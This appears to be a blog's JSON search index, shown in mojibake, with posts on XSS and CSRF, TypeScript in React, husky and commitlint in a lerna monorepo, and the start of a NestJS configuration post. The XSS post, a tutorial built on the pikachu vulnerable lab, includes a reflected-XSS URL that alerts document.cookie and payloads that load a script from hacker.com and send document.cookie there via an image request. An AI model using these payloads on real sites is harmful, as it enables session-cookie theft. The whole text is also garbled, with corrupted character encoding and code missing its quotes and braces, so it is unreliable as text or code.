Login;","tags":["React","Remix"],"categories":["React","Remix"]},{"title":"XSSå’ŒCSRFçš„åŒºåˆ«åŠé˜²å¾¡","path":"/2022/03/08/7948600e1d25/","content":"åœ¨ Web å®‰å…¨é¢†åŸŸï¼ŒXSS å’Œ CSRF æ˜¯ä¸ªè€ç”Ÿå¸¸è°ˆçš„éƒ½è¡Œäº†ï¼Œç‰¹åˆ«æ˜¯é¢è¯•çš„æ—¶å€™ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šåŒå­¦å°†å®ƒä»¬ææ··ã€‚æœ¬æ–‡å°†ç®€å•çš„ä»‹ç»ä¸‹å®ƒä»¬çš„åŒºåˆ«ï¼Œä»¥åŠå¸¸è§çš„é˜²å¾¡æ‰‹æ®µã€‚ ä»‹ç»ä¹‹å‰ï¼Œå…ˆä¸Šä¸‹ç»´åŸºç™¾ç§‘ï¼š XSSï¼šè·¨ç«™è„šæœ¬ï¼ˆCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠç”¨æˆ·ç«¯è„šæœ¬è¯­è¨€ã€‚ CSRF:è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚ XSSç”¨â€œäººè¯è¯´â€ï¼ŒXSS å°±æ˜¯æ¶æ„æ”»å‡»è€…å¾€ Web é¡µé¢é‡Œæ’å…¥æ¶æ„ Script ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„ Script ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ XSSæ”»å‡»å¯ä»¥åˆ†ä¸º3ç±»ï¼šåå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰ã€å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰ã€åŸºäºDOMã€‚ åå°„å‹åå°„å‹æ˜¯æŒ‡xssä»£ç åœ¨è¯·æ±‚çš„urlä¸­ï¼Œè€Œåæäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£æåï¼ŒXSSä»£ç éšç€å“åº”å†…å®¹ä¸€èµ·ä¼ ç»™å®¢æˆ·ç«¯è¿›è¡Œè§£ææ‰§è¡Œã€‚ï¼ˆç›´æ¥åå°„æ˜¾ç¤ºåœ¨é¡µé¢ï¼‰ æµç¨‹å›¾å¦‚ä¸‹ï¼š é€šè¿‡æµç¨‹å›¾å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“å­˜å‚¨å‹XSSçš„å¸¸ç”¨æ”»å‡»æµç¨‹ä¸ºï¼šæ”»å‡»è€…æ„é€ å¸¦æœ‰æ¶æ„XSSä»£ç çš„URLâ€”åˆ«çš„ç”¨æˆ·è®¿é—®è¿™ä¸ªURLâ€”æ¶æ„ä»£ç è¢«æœåŠ¡å™¨è§£æâ€”ä¼ é€’ç»™å‰ç«¯æ¸²æŸ“å®ç°æ”»å‡»ã€‚ å¦‚æœä½ æƒ³ææ‡‚ä¸€ä¸ªæ¼æ´ï¼Œæ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯ï¼šä½ å¯ä»¥è‡ªå·±å…ˆåˆ¶é€ å‡ºè¿™ä¸ªæ¼æ´ï¼ˆç”¨ä»£ç ç¼–å†™ï¼‰ï¼Œç„¶åå†åˆ©ç”¨å®ƒï¼Œæœ€åå†ä¿®å¤å®ƒ pikachuï¼Œæ˜¯ä¸ªå¼€æºçš„æ¼æ´æµ‹è¯•å¹³å°ï¼ŒæŒ‰ç…§ README å¯åŠ¨é¡¹ç›®åï¼Œè·³è½¬åˆ°ã€Œåå°„å‹xssã€é¡µé¢ï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ã€Œkobeã€åï¼Œç‚¹å‡» submitï¼Œæ‰“å¼€æ§åˆ¶å°ï¼Œè§‚å¯Ÿåç«¯è¿”å›çš„ htmlï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥æ¡†çš„å†…å®¹å‡ºç°åœ¨ html å’Œé“¾æ¥é‡Œï¼Œè¿™å°±ç»™æˆ‘ä»¬å¸¦æ¥äº†å¯ä¹˜ä¹‹æœºï¼Œå¦‚æœè¾“å…¥æ¡†é‡Œè¾“å…¥çš„æ˜¯ä¸€æ®µ script è„šæœ¬å‘¢ï¼Ÿ è„šæœ¬è¢«æ’å…¥åˆ° htmlhä¸­ï¼Œå¹¶ä¸”è¢«æ‰§è¡Œã€‚è¿™æ—¶å°†è¿™æ®µé“¾æ¥ http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3Esubmit=submit# å‘é€ç»™ç”¨æˆ·ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œå°±å®Œæˆäº†ä¸€æ¬¡ XSS æ”»å‡»ã€‚ ç°åœ¨çš„è„šæœ¬åªæ˜¯ alert ç”¨æˆ·çš„ cookieï¼Œè¿˜åœç•™åœ¨æ¶æçš„å±‚é¢ï¼Œå¦‚æœå°† cookie å‘é€åˆ°æ¶æ„æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šï¼Œé‚£å°±æ˜¯ä¸€èµ·ä¸¥é‡çš„å®‰å…¨äº‹æ•…äº†ã€‚ script src=http://hacker.com/hacker.js/script var img = new Image();img.src = http://hacker.com/hack.png?q= + document.cookie;document.body.append(img); å­˜å‚¨å‹å­˜å‚¨å‹ XSS ä¼šæŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ® â€œå­˜å‚¨â€ åœ¨æœåŠ¡å™¨ç«¯ï¼Œå½“æµè§ˆå™¨è¯·æ±‚æ•°æ®æ—¶ï¼Œè„šæœ¬ä»æœåŠ¡å™¨ä¸Šä¼ å›å¹¶æ‰§è¡Œã€‚è¿™ç§ XSS æ”»å‡»å…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ã€‚ åå°„å‹ XSS æ¯æ¬¡æ”»å‡»è¿˜éœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»è¯±é¥µé“¾æ¥ï¼Œå¦‚æœç”¨æˆ·æ— åŠ¨äºè¡·ï¼Œæ”»å‡»è€…ä¹Ÿæ˜¯æ— å¯å¥ˆä½•ï¼Œè€Œå­˜å‚¨å‹ XSS ä¸€æ—¦å°†æ¶æ„è„šæœ¬å…¥åº“äº†ï¼Œä»»ä½•è®¿é—®åˆ°è¿™æ®µè„šæœ¬ç”¨æˆ·éƒ½ä¼šä¸­æ‹›ã€‚ æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªåœºæ™¯æ˜¯æ”»å‡»è€…åœ¨ç¤¾åŒºæˆ–è®ºå›ä¸Šå†™ä¸‹ä¸€ç¯‡åŒ…å«æ¶æ„ JavaScript ä»£ç çš„æ–‡ç« æˆ–è¯„è®ºï¼Œæ–‡ç« æˆ–è¯„è®ºå‘è¡¨åï¼Œæ‰€æœ‰è®¿é—®è¯¥æ–‡ç« æˆ–è¯„è®ºçš„ç”¨æˆ·ï¼Œéƒ½ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­æ‰§è¡Œè¿™æ®µæ¶æ„çš„ JavaScript ä»£ç ã€‚ æµç¨‹å›¾å¦‚ä¸‹ï¼š é€šè¿‡æµç¨‹å›¾å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“å­˜å‚¨å‹XSSçš„å¸¸ç”¨æ”»å‡»æµç¨‹ä¸ºï¼šæ”»å‡»è€…å‰ç«¯æ’å…¥æ¶æ„XSSä»£ç â€”åç«¯ä¸åšå¤„ç†ä¼ å…¥æ•°æ®åº“â€”åˆ«çš„ç”¨æˆ·è®¿é—®é¡µé¢â€”åç«¯ä»æ•°æ®åº“ä¸­è°ƒç”¨XSSä»£ç â€”å‰ç«¯æ¸²æŸ“(æ‰§è¡Œjsè„šæœ¬)æ¶æ„ä»£ç å®ç°æ”»å‡»ã€‚ è¿™é‡Œè¿˜æ˜¯ç”¨ pikachu æ¥å®æ“ä¸‹ï¼Œæ‰“å¼€ã€Œå­˜å‚¨å‹xssã€é¡µé¢ï¼Œè¾“å…¥æ¡†ä¸­è¾“å…¥ä¸€æ®µ script è„šæœ¬ï¼š æäº¤åå¹¶åˆ·æ–°é¡µé¢ï¼Œè¿™æ®µè„šæœ¬è¢«æ³¨å…¥åˆ° html ä¸­ï¼Œå¹¶æ‰§è¡Œäº†"},{"title":"åœ¨ React é¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨ Typescript","path":"/2021/04/19/368700e46601/","content":"TypeScript æ˜¯ Javascript çš„è¶…é›†ï¼Œæ‰©å±•äº† JavaScript çš„è¯­æ³•ï¼Œç»™ JavaScript å¸¦æ¥äº†é™æ€ç±»å‹æ”¯æŒï¼Œäº†è§£å¦‚ä½•åœ¨ React é¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨ Typescriptï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬å†™å‡ºæ›´ä¼˜é›…çš„ä»£ç ã€‚ ã€Œä¼˜é›…ã€çš„å«ä¹‰ï¼š å‡å°‘ç¼–å†™å†—ä½™çš„ç±»å‹å®šä¹‰ã€ç±»å‹æ ‡æ³¨ï¼Œå……åˆ†åˆ©ç”¨tsçš„è‡ªåŠ¨ç±»å‹æ¨æ–­ï¼Œä»¥åŠå¤–éƒ¨æä¾›çš„ç±»å‹å£°æ˜ã€‚ ç±»å‹å®‰å…¨ï¼šæä¾›è¶³å¤Ÿçš„ç±»å‹ä¿¡æ¯æ¥é¿å…è¿è¡Œæ—¶é”™è¯¯ï¼Œè®©é”™è¯¯æš´éœ²åœ¨å¼€å‘æœŸã€‚è¿™äº›ç±»å‹ä¿¡æ¯åŒæ—¶èƒ½å¤Ÿæä¾›ä»£ç è¡¥å…¨ã€è·³è½¬åˆ°å®šä¹‰ç­‰åŠŸèƒ½ã€‚ ç»„ä»¶å®šä¹‰å‡½æ•°ç»„ä»¶import * as React from react;// å¦‚æœåœ¨tsconfigä¸­è®¾ç½®äº†allowSyntheticDefaultImports: true// ä½ è¿˜å¯ä»¥æ›´ç²¾ç»ƒåœ°import reactï¼š// import React from react;interface IProps // CSSPropertiesæä¾›æ ·å¼å£°æ˜çš„ç±»å‹ä¿¡æ¯ // ç”¨æˆ·ä¼ å…¥styleçš„æ—¶å€™å°±èƒ½å¤Ÿè·å¾—ç±»å‹æ£€æŸ¥å’Œä»£ç è¡¥å…¨ style?: React.CSSProperties; // ä½¿ç”¨@types/reactæä¾›çš„äº‹ä»¶ç±»å‹å®šä¹‰ï¼Œè¿™é‡ŒæŒ‡å®ševent.targetçš„ç±»å‹æ˜¯HTMLButtonElement onClick(event: React.MouseEventHTMLButtonElement): void; // ...const MyComponent: React.FCIProps = (props) = const children, ...restProps = props; return div ...restPropschildren/div; FCæ˜¯FunctionComponentçš„ç¼©å†™ã€‚ IPropsæ— éœ€å£°æ˜childrenå±æ€§çš„ç±»å‹ã€‚React.FCä¼šè‡ªåŠ¨ä¸ºpropsæ·»åŠ è¿™ä¸ªå±æ€§ç±»å‹ã€‚å½“ç„¶ï¼Œå¦‚æœchildrenæœŸæœ›ä¸€ä¸ªrender propï¼Œæˆ–è€…æœŸæœ›å…¶ä»–ç‰¹æ®Šçš„å€¼ï¼Œé‚£ä¹ˆä½ è¿˜æ˜¯è¦è‡ªå·±ç»™childrenå£°æ˜ç±»å‹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„React.ReactNodeã€‚ propsæ— éœ€åšç±»å‹æ ‡æ³¨ã€‚ å‡½æ•°ç»„ä»¶defaultPropsï¼ˆDeprecateï¼‰å¦‚æœä½ éœ€è¦å®šä¹‰defaultPropsï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨React.FCï¼Œå› ä¸ºReact.FCå¯¹defaultPropsçš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼š const defaultProps = who: Johny Five;type IProps = age: number typeof defaultProps;export const Greet = (props: IProps) = return div123/div ;Greet.defaultProps = defaultProps; äº‹å®ä¸Šï¼Œä¸€ä¸ªæè®®åœ¨å‡½æ•°ç»„ä»¶ä¸­åºŸå¼ƒdefaultPropsçš„React rfcå·²ç»è¢«æ¥å—ï¼Œæ‰€ä»¥ä»¥åè¿˜æ˜¯å°½é‡å‡å°‘åœ¨å‡½æ•°ç»„ä»¶ä¸Šä½¿ç”¨defaultPropsï¼Œä½¿ç”¨ES6åŸç”Ÿçš„å‚æ•°è§£æ„+é»˜è®¤å‚æ•°ç‰¹æ€§å°±å·²ç»èƒ½å¤Ÿæ»¡è¶³éœ€è¦ï¼š const TestFunction: FunctionComponentProps = ( foo = bar ) = divfoo/div ç±»ç»„ä»¶interface IProps message: string;interface IState count: number;export class MyComponent extends React.ComponentIProps, IState state: IState = // duplicate IState annotation for better type inference count: 0 ; render() return ( div this.props.message this.state.count /div ); å¦‚æœä½ é€šè¿‡å£°æ˜stateå±æ€§æ¥åˆå§‹åŒ–stateï¼Œé‚£ä¹ˆä½ éœ€è¦ä¸ºè¿™ä¸ªå±æ€§å¢åŠ IStateç±»å‹æ ‡æ³¨ã€‚è™½ç„¶è¿™ä¸å‰é¢çš„React.ComponentIProps, IStateæœ‰é‡å¤çš„å«Œç–‘ï¼Œä½†æ˜¯è¿™ä¸¤è€…å®é™…ä¸Šæ˜¯ä¸åŒçš„ï¼š React.ComponentIProps, IStateåªæ˜¯æ ‡æ³¨äº†åŸºç±»çš„stateå±æ€§ç±»å‹ã€‚ è€Œå½“ä½ åœ¨å­ç±»å£°æ˜stateæ—¶ï¼Œä½ å¯ä»¥ä¸ºstateæ ‡æ³¨ä¸€ä¸ªã€IStateçš„å­ç±»å‹ã€‘ä½œä¸ºoverrideã€‚è¿™æ ·ï¼Œthis.stateä¼šä»¥å­ç±»ä¸­çš„stateå±æ€§å£°æ˜ä½œä¸ºç±»å‹ä¿¡æ¯çš„æ¥æºã€‚ å»ºè®®ä½¿ç”¨å‡½æ•°ç»„ä»¶ã€‚ å¯æ¸²æŸ“èŠ‚ç‚¹ç±»å‹å¯æ¸²æŸ“èŠ‚ç‚¹å°±æ˜¯ï¼šå¯ä»¥ç›´æ¥è¢«ç»„ä»¶æ¸²æŸ“å‡½æ•°è¿”å›çš„å€¼ã€‚ ä¸å¯æ¸²æŸ“èŠ‚ç‚¹æœ‰å…³çš„ç±»å‹å®šä¹‰å¦‚ä¸‹ï¼ˆæ‘˜å½•è‡ª[@typesreact](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187ï¼‰ï¼š type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends ArrayReactNode type ReactFragment = | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; ç»„ä»¶ç±»å‹ React.FCPropsï¼ˆå³ React.FunctionComponentPropsï¼‰ React.ComponentProps, State React.ComponentTypePropsï¼ˆå³ComponentClassP | FunctionComponentPï¼‰ åœ¨å†™HOCçš„æ—¶å€™ç»å¸¸ç”¨åˆ°ã€‚ const withState = P extends WrappedComponentProps( WrappedComponent: React.ComponentTypeP,) = ... è·å–å¹¶æ‰©å±•åŸç”Ÿå…ƒç´ çš„propsç±»å‹æ¯”å¦‚ï¼Œä»¥ä¸‹ä¾‹å­è·å–å¹¶æ‰©å±•äº†buttonçš„propsç±»å‹ï¼š export const PrimaryButton = ( props: Props React.HTMLPropsHTMLButtonElement) = Button size=ButtonSizes.default ...props /; PrimaryButtonèƒ½å¤Ÿæ¥å—æ‰€æœ‰åŸç”Ÿbuttonæ‰€æ¥å—çš„propsã€‚å…³é”®åœ¨äºReact.HTMLPropsã€‚ è·å–å¹¶æ‰©å±•ç¬¬ä¸‰æ–¹ç»„ä»¶çš„propsç±»å‹import Button from library; // but doesnt export ButtonProps! oh no!type ButtonProps = React.ComponentPropstypeof Button; // no problem! grab your own!type AlertButtonProps = OmitButtonProps, onClick; // modifyconst AlertButton: React.FCAlertButtonProps = props = ( Button onClick=() = alert(hello) ...props /); äº‹ä»¶ç±»å‹@types/reactæä¾›äº†å„ç§äº‹ä»¶çš„ç±»å‹ï¼Œæ¯”å¦‚ä»¥ä¸‹æ˜¯ä½¿ç”¨React.FormEventçš„ä¾‹å­ï¼š class App extends React.Component , text: string state = text: , onChange = (e: React.FormEventHTMLInputElement): void = this.setState( text: e.currentTarget.value ) render() return ( div input type=text value=this.state.text onChange=this.onChange / /div ) åœ¨Reactä¸­ï¼Œæ‰€æœ‰äº‹ä»¶ï¼ˆåŒ…æ‹¬FormEventã€KeyboardEventã€MouseEventç­‰ï¼‰éƒ½æ˜¯SyntheticEventçš„å­ç±»å‹ã€‚ä»–ä»¬åœ¨@typesreactä¸­å®šä¹‰å¦‚ä¸‹ï¼š // DOMäº‹ä»¶çš„åŸºæœ¬å±æ€§éƒ½å®šä¹‰åœ¨è¿™é‡Œinterface BaseSyntheticEventE = object, C = any, T = any nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;interface SyntheticEventT = Element, E = Event extends BaseSyntheticEventE, EventTarget T, EventTarget // å…·ä½“çš„äº‹ä»¶ç±»å‹ï¼šinterface FormEventT = Element extends SyntheticEventT interface KeyboardEventT = Element extends SyntheticEventT, NativeKeyboardEvent altKey: boolean; // ...interface MouseEventT = Element, E = NativeMouseEvent extends SyntheticEventT, E altKey: boolean; // ...// ...","tags":["React"],"categories":["React"]},{"title":"lernaé¡¹ç›®ä¸­é›†æˆhuskyã€lint-stagedã€commitlintå’Œcz-customizable","path":"/2021/04/02/b727669177ea/","content":"Monorepo æ˜¯é’ˆå¯¹å•ä»“åº“ã€å¤š package çš„æµè¡Œè§£å†³æ–¹æ¡ˆ, lerna æ˜¯å®ƒçš„ä¸€ç§å®ç°ã€‚ è¯´æ˜é‡è¦packageç‰ˆæœ¬è¯´æ˜ï¼š â€œhuskyâ€: â€œ^6.0.0â€ â€œlint-stagedâ€: â€œ^10.5.4â€ â€œ@commitlintcliâ€: â€œ^12.0.1â€ â€œ@commitlintconfig-conventionalâ€: â€œ^12.0.1â€ â€œcz-customizableâ€: â€œ^6.3.0â€ é…ç½®huskyåœ¨lernaé¡¹ç›®æ ¹ç›®å½•ä¸­å®‰è£…husky: yarn add husky -D æ³¨æ„ï¼šhusky v4å’Œv6ç‰ˆæœ¬çš„é…ç½®æ–¹å¼å¤§ç›¸å¾„åº­ï¼Œè¿™é‡Œåªä»‹ç»v6ç‰ˆæœ¬çš„é…ç½®æ–¹å¼ï¼Œv4çš„ç½‘ä¸Šä¸€æœä¸€å¤§æŠŠï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç» åœ¨package.jsonçš„scriptsä¸­æ·»åŠ prepare: husky installï¼Œå¹¶è¿è¡Œè¿™æ¡å‘½ä»¤ï¼š npm set-script prepare husky install npm run prepare æ·»åŠ ä¸€ä¸ªhook: npx husky add .husky/pre-commit npm test ä¸Šé¢è¿™ä¸ªå‘½ä»¤ä¼šåœ¨.huskyç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªpre-commitæ–‡ä»¶ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š #!/bin/sh. $(dirname $0)/_/husky.shnpm test ä»¥ä¸Šéƒ½æ˜¯æ‰‹åŠ¨å®‰è£…huskyçš„è¿‡ç¨‹ï¼Œå½“ç„¶å®˜æ–¹ä¹Ÿæä¾›äº†ä¸€é”®å®‰è£…å’Œé…ç½®è„šæœ¬ï¼Œæ¨èä½¿ç”¨ï¼š npx husky-init npm install # npmnpx husky-init yarn # Yarn 1yarn dlx husky-init --yarn2 yarn # Yarn 2 å¦‚æœä½¿ç”¨çš„æ˜¯v4ç‰ˆæœ¬çš„huskyï¼Œæƒ³å‡çº§åˆ°v6ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½åï¼Œä¸€é”®è¿ç§»ï¼š // npmnpm install husky@6 --save-dev \\ npx husky-init \\ npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ npx husky-init \\ npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ yarn dlx husky-init --yarn2 \\ npm exec -- github:typicode/husky-4-to-6 --remove-v4-config æ›´å¤šé…ç½®ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://typicode.github.io/husky/#/ é…ç½®lint-stagedåœ¨lernaé¡¹ç›®ä¸­ï¼Œç”±äºæ‰€æœ‰å­é¡¹ç›®å…¬ç”¨ä¸€ä¸ª repo æºä»£ç ä»“åº“ï¼Œå› æ­¤å®ƒçš„ husky é’©å­åªèƒ½å»ºç«‹åœ¨æœ€é¡¶å±‚ç›®å½•ï¼› è€Œæ¯æ¬¡ commit éƒ½å¾ˆæœ‰å¯èƒ½æ˜¯å¤šä¸ªå­é¡¹ç›®éƒ½æœ‰æ”¹åŠ¨ï¼Œè¿™ä¸ªæ—¶å€™ä½¿ç”¨ lint-staged æ—¶ï¼Œå°±ä¸ä½†è¦åŒºåˆ†æ–‡ä»¶ç±»å‹ï¼Œè¿˜è¦åŒºåˆ†æ”¹åŠ¨æ–‡ä»¶æ‰€åœ¨çš„å­é¡¹ç›®ï¼ˆå› ä¸ºä¸åŒçš„å­é¡¹ç›®å¯èƒ½ä¼šæœ‰ä¸åŒçš„æ ¡éªŒå¤„ç†ï¼‰ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ lerna å‘½ä»¤æ¥å®ç°å¯¹â€œå“ªä¸ªå­é¡¹ç›®æœ‰ä¿®æ”¹â€çš„åˆ¤æ–­ï¼›è€Œ lint-staged å°±éœ€è¦å®‰è£…åœ¨ä»»ä½•ä¸€ä¸ªéœ€è¦åšæ ¡éªŒçš„å­é¡¹ç›®ä¸­ã€‚ æ·»åŠ æˆ–ä¿®æ”¹.huskyç›®å½•ä¸‹çš„pre-commité’©å­å¦‚ä¸‹ï¼š #!/bin/sh. $(dirname $0)/_/husky.shlerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents å…¶ä¸­ï¼Œprecommit æ˜¯åœ¨pre-commité’©å­ä¸­è§¦å‘çš„å­é¡¹ç›®çš„å‘½ä»¤ åœ¨å­é¡¹ç›®ä¸­å®‰è£…å’Œé…ç½®lint-stagedï¼Œå¹¶æ·»åŠ precommitå‘½ä»¤ å®‰è£…lint-stagedï¼š lerna add lint-staged --scope=xxxx -D åœ¨æ·»åŠ precommitå‘½ä»¤ï¼š precommit: lint-staged é…ç½®lint-stagedï¼š lint-staged: *.ts,tsx,js,jsx: [ eslint ], æ›´å¤šé…ç½®ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://github.com/okonet/lint-staged#readme é…ç½®commitlintå’Œcz-customizableæ¯ä¸ªå›¢é˜Ÿå¯¹æäº¤çš„commit messageæ ¼å¼æœ‰çº¦å®šä¿—ç§°çš„è¦æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„è§„èŒƒï¼Œå¯¼è‡´å¤§å®¶æäº¤çš„commit messageæˆ–å¤šæˆ–å°‘ä¸å¤ªä¸€æ ·ã€‚å› æ­¤ï¼Œéœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©å¤§å®¶ç»Ÿä¸€commit messageçš„æ ¼å¼ï¼Œä¹Ÿæ–¹ä¾¿åç»­çš„åˆ†æå’Œæ‹“å±•ã€‚ cz-customizableæ˜¯ä¸€ä¸ªå¸®åŠ©ä¹¦å†™commit messageçš„å·¥å…·ï¼Œè€Œcommitlintæ˜¯ä¸€ä¸ªæ ¡éªŒcommit messageçš„å·¥å…·ã€‚ å®‰è£…commitlintå’Œcz-customizable: yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D æ·»åŠ commit-msgé’©å­ npx husky add .husky/commit-msg yarn commitlint --edit ç”Ÿæˆå¦‚ä¸‹æ–‡ä»¶ï¼š #!/bin/sh. $(dirname $0)/_/husky.shyarn commitlint --edit åœ¨package.jsonä¸­æ·»åŠ ä»¥ä¸‹é…ç½®ï¼š ... config: commitizen: path: ./node_modules/cz-customizable , cz-customizable: config: ./.cz-config.js , ... åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»º.cz-config.jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š module.exports = types: [ value: feat, name: feat: A new feature , value: fix, name: fix: A bug fix , value: style, name: style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc), , value: refactor, name: refactor: A code change that neither fixes a bug nor adds a feature, , value: revert, name: revert: Revert to a commit , value: chore, name: chore: Changes to the build process or auxiliary tools and libraries such as documentation generation, , value: docs, name: docs: Documentation only changes , value: perf, name: perf: A code change that improves performance, , value: test, name: test: Adding missing tests , ], scopes: [ name: frontend , name: backend , name: service , ], messages: type: Select the type of change that youre committing:, scope: Select the scope of change that youre committing:, // used if allowCustomScopes is true customScope: Denote the custom scope:, subject: Write a SHORT, IMPERATIVE tense description of the change: , body: Provide a LONGER description of the change (optional). Use | to break new line: , breaking: List any BREAKING CHANGES (optional): , footer: List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: , confirmCommit: Are you sure you want to proceed with the commit above?, , allowCustomScopes: true, åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­æ–°å»º.commitlintrc.jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š const typeEnum = require(./.cz-config);module.exports = extends: [@commitlint/config-conventional], rules: type-enum: [2, always, typeEnum.types.map((i) = i.value)], scope-enum: [2, always, typeEnum.scopes.map((i) = i.name)], scope-empty: [2, never], ,; é…ç½®å®Œæˆåï¼Œæ¯æ¬¡æäº¤commitæ—¶ï¼Œå¯ä»¥ä½¿ç”¨git czæ›¿æ¢git commitå‘½ä»¤ï¼Œä»è€Œè¾…åŠ©æˆ‘ä»¬æ›´åŠ è§„èŒƒçš„ä¹¦å†™commit messageã€‚ æ›´å¤šè¯¦ç»†é…ç½®ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://juejin.cn/post/6844903831893966856 æ€»ç»“ä»¥ä¸Šå°±æ˜¯æˆ‘å¯¹å¦‚ä½•åœ¨lernaé¡¹ç›®ä¸­é…ç½®huskyã€lint-stagedå’ŒCzå·¥å…·çš„ä¸€äº›ç²—ç•¥è®¤çŸ¥ï¼Œå½“ç„¶ä¸ä»…ä»…æ˜¯lernaé¡¹ç›®ï¼Œä¹Ÿé€‚ç”¨äºä»»ä½•å‰ç«¯é¡¹ç›®ã€‚ é“¾æ¥ huskyå®˜æ–‡æ–‡æ¡£ lint-stagedå®˜æ–¹æ–‡æ¡£ Czå·¥å…·é›†ä½¿ç”¨ä»‹ç»"},{"title":"NestJS - é…ç½®","path":"/2021/03/17/1255498d9728/","content":"åº”ç”¨ç¨‹åºé€šå¸¸è¿è¡Œåœ¨ä¸åŒçš„ç¯å¢ƒï¼Œä¾‹å¦‚ï¼Œå¼€å‘æœ‰å¼€å‘ç¯å¢ƒã€æµ‹è¯•ç¯å¢ƒï¼Œçº¿ä¸Šæœ‰é¢„å‘å¸ƒç¯å¢ƒã€ç”Ÿäº§ç¯å¢ƒï¼Œè€Œè¿è¡Œåœ¨ä¸åŒçš„ç¯å¢ƒï¼Œéœ€è¦æœ‰ä¸åŒçš„é…ç½®ï¼Œä¾‹å¦‚æ•°æ®åº“çš„é…ç½®ç­‰ã€‚ åœ¨Nodeä¸­ï¼Œå¤–éƒ¨å®šä¹‰çš„ç¯å¢ƒå˜é‡é€šè¿‡procress.envå…¨å±€å¯è§ã€‚åœ¨Node.jsåº”ç”¨ç¨‹åºä¸­ï¼Œé€šå¸¸ä½¿ç”¨.envæ–‡ä»¶æ¥é…ç½®è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­æ¯ä¸ªé”®ä»£è¡¨ä¸€ä¸ªç‰¹å®šçš„å€¼ï¼Œä»¥ä»£è¡¨æ¯ä¸ªç¯å¢ƒã€‚ è§£æ.envæ–‡ä»¶å¹¶åŠ 